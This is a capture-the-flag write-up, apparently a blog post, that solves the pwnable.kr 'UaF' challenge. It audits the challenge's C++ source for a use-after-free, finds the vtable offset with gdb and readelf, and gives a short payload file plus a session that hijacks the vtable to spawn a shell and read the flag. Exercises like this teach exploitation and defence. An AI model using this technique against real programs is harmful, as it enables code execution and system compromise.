---
layout: post
title:  "UaF - Write-Up [Pwnable.kr]"
date:   2016-07-30 14:30:00 +0200
categories: security wargame pwnable
---

[Pwnable.kr](http://pwnable.kr) is a non-commercial wargame site which provides various pwn challenges regarding system exploitation. 

In this blog post I'll write-up how I managed to pass the "UaF" (Use-After-Free) challenge.


### Code

``` cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>

using namespace std;

class Human {
private:
	virtual void give_shell() {
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce() {
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human {
public:
	Man(string name, int age) {
		this->name = name;
		this->age = age;
	}
	virtual void introduce() {
		Human::introduce();
		cout << "I am a nice guy!" << endl;
	}
};

class Woman: public Human {
public:
	Woman(string name, int age) {
		this->name = name;
		this->age = age;
	}
	virtual void introduce() {
		Human::introduce();
		cout << "I am a cute girl!" << endl;
	}
};

int main(int argc, char *argv[]) {
	Human *m = new Man("Jack", 25);
	Human *w = new Woman("Jill", 21);

	size_t len;
	char *data;
	unsigned int op;

	while (1) {
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch (op) {
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

### Audit

As we can see, we allocate a `Man` and a `Woman`, than we enter in an infinity loop witch asks for an operation:

- `use` performs a call to the `introduce` method for both objects.
- `after` allocates an arbitrary sized array (the size is passed in `argv[1]`) and reads the content of the passed file (`argv[2]`)  into it.
- `free` performs a `delete` call to the two objects previously allocated.

As we can easily imagine, if we `free` and then `use` we will get a __Segmentation fault__ because we are trying to dereference the two deallocated objects.
Instead we are going to allocate an object with a crafted vtable pointer in order to point the `introduce` function to `give_shell`.


Now let's debug the binary in order to understand what's happen at binary level:

```nasm
$ gdb uaf
(gdb)
(gdb) set disassembly-flavor intel
(gdb) set print asm-demangle on
(gdb) disas main
Dump of assembler code for function main:
... (output truncated for brevity) ...
   0x0000000000400f13 <+79>:	call   0x401264 <Man::Man(std::string, int)>
   0x0000000000400f18 <+84>:	mov    QWORD PTR [rbp-0x38],rbx
... (output truncated for brevity) ...
```

At address __0x0000000000400f18__ we can see that we are saving the address of the `Man` object in the stack at `[rbp-0x38]`.

```nasm
(gdb) x/x $rbp-0x38
0x7ffea0a21028:	0x00c65c50
```

So let's see where the `vtable` is (knowing that the `vtable`'s pointer is at the very beginning of our object's memory):

```nasm
(gdb) x/x 0x00c65c50
0xc65c50:	0x00401570
(gdb) x/2g 0x00401570
0x401570 <vtable for Man+16>:	0x000000000040117a      0x00000000004012d2
                                ^Human::give_shell()    ^Man::introduce()
```

Now we can also double check with the `readelf` command:

```nasm
$ readelf uaf -a | grep Man | c++filt 
    57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 typeinfo for Man
    78: 00000000004015c8     5 OBJECT  WEAK   DEFAULT   15 typeinfo name for Man
->  83: 0000000000401560    32 OBJECT  WEAK   DEFAULT   15 vtable for Man
    94: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   100: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
-> 110: 00000000004012d2    54 FUNC    WEAK   DEFAULT   13 Man::introduce()
$ readelf uaf -a | grep Human | c++filt 
    59: 0000000000401580    32 OBJECT  WEAK   DEFAULT   15 vtable for Human
    60: 0000000000401192   125 FUNC    WEAK   DEFAULT   13 Human::introduce()
    71: 000000000040123a    41 FUNC    WEAK   DEFAULT   13 Human::~Human()
    73: 00000000004015e8     7 OBJECT  WEAK   DEFAULT   15 typeinfo name for Human
->  85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 Human::give_shell()
    91: 0000000000401210    41 FUNC    WEAK   DEFAULT   13 Human::Human()
    92: 0000000000401210    41 FUNC    WEAK   DEFAULT   13 Human::Human()
   101: 00000000004015f0    16 OBJECT  WEAK   DEFAULT   15 typeinfo for Human
   118: 000000000040123a    41 FUNC    WEAK   DEFAULT   13 Human::~Human()
```

At this point it's pretty clear what we have to do. We have to allocate some memory with the `after` option, to simulate a real `Man` object but with the `vtable` pointer modified in order to call the `give_shell` function instead of `introduce` when we do the `use` option.

If `0x401570` is the `vtable`'s address and we call `introduce` which is at `0x401578` it means that the call we do is at offset `0x401578`-`0x401570` = __8__. Now we can subtract the offset from the `vtable`'s address to obtain the modified pointer: 

```nasm
(gdb) p/x (0x401570-8)
$1 = 0x401568
```

### Exploit

Now let's see how we can exploit this `UaF`:

```python
python -c 'print ("\x68\x15\x40\x00" + "\x00"*4)' > /tmp/uaf-poc
```

```python
./uaf 8 /tmp/uaf-poc
1. use
2. after
3. free
-> 3
1. use
2. after
3. free
-> 2
your data is allocated
1. use
2. after
3. free
-> 2
your data is allocated
1. use
2. after
3. free
-> 1
$ 
$ cat flag
************
```

### Conclusion

Zero out your pointers when you deallocate memory!
